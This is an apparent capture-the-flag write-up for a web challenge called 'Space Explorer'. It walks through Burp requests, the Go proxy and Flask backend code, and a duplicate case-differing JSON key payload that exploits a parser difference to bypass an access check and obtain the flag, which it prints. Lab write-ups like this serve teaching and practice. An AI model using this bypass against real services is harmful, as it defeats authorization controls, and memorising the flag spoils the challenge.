# Space Explorer

Dificulty: Fucking Easy

Category: Web

## 1. Explore POST requests

### Normal request

Action = getcosmic: 
``` Burp suite

POST /execute HTTP/1.1
Host: 154.57.164.69:35413
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.69:35413/
Content-Type: application/json
Content-Length: 51
Origin: http://154.57.164.69:35413
DNT: 1
Connection: keep-alive
Priority: u=0

{"action":"getcosmic"}
```

Response:
``` Burp suite

HTTP/1.1 200 OK
Date: Sun, 18 Oct 2026 06:29:21 GMT
Content-Length: 104
Content-Type: text/plain; charset=utf-8

{"name":"Supernova Remnant","src":"https://images.unsplash.com/photo-1454789548928-9efd52dc4031?w=600"}


```

### Invalid request

Action = getSecureCode:
``` Burp suite
POST /execute HTTP/1.1
Host: 154.57.164.69:35413
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.69:35413/
Content-Type: application/json
Content-Length: 28
Origin: http://154.57.164.69:35413
DNT: 1
Connection: keep-alive
Priority: u=0

{"action":"getSecureCode"
}

```

response:

``` Burp suite
HTTP/1.1 200 OK
Date: Sun, 18 Oct 2026 06:30:19 GMT
Content-Length: 41
Content-Type: text/plain; charset=utf-8

Access denied: Invalid security clearance
```

## 2. Explore the code

Download zip file, check the logic inside   

`app.py`
``` python

@app.route('/execute', methods=['POST'])
def execute():
    if not request.is_json:
        return jsonify({"error": "Invalid transmission format"}), 400

    data = request.get_json()
    
    if 'action' not in data:
        return jsonify({"error": "No command received"}), 400

    if data['action'] == "getcosmic":
        anomaly = random.choice(COSMIC_ANOMALIES)
        return jsonify(anomaly)
    elif data['action'] == "getSecureCode":
        return jsonify({
            "flag": os.getenv("FLAG", "HTB{flag_not_set}"),
            "name": "Captain's Log",
            "src": "https://images.unsplash.com/photo-1534447677768-be436bb09401?w=600"
        })
    else:
        return jsonify({"error": "Unknown command"}), 400


```


`main.go`
``` go

func executeHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
		return
	}

	body, err := io.ReadAll(r.Body)
	if err != nil {
		http.Error(w, "Failed to read request body", http.StatusBadRequest)
		return
	}

	var requestData RequestData
	if err := json.Unmarshal(body, &requestData); err != nil {
		http.Error(w, "Invalid JSON", http.StatusBadRequest)
		return
	}

	switch requestData.Action {
	case "getcosmic":
		resp, err := http.Post("http://localhost:8081/execute", "application/json", bytes.NewBuffer(body))
		if err != nil {
			log.Printf("Failed to reach cosmic scanner: %v", err)
			http.Error(w, "Scanner offline", http.StatusInternalServerError)
			return
		}
		defer resp.Body.Close()
		io.Copy(w, resp.Body)
	case "getSecureCode":
		w.Write([]byte("Access denied: Invalid security clearance"))
	default:
		http.Error(w, "Invalid command", http.StatusBadRequest)
	}
}
```

## 3. Get a flag

``` Burp suite
POST /execute HTTP/1.1
Host: 154.57.164.69:35413
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: http://154.57.164.69:35413/
Content-Type: application/json
Content-Length: 56
Origin: http://154.57.164.69:35413
DNT: 1
Connection: keep-alive
Priority: u=0


{
"action":  "getSecureCode", "Action":"getcosmic"
}
```

response:
``` Burp suite
HTTP/1.1 200 OK
Date: Sun, 18 Oct 2026 06:22:28 GMT
Content-Length: 128
Content-Type: text/plain; charset=utf-8

{"flag":"HTB{C0SM1C-BYP4SS}","name":"Captain's Log","src":"https://images.unsplash.com/photo-1534447677768-be436bb09401?w=600"}


```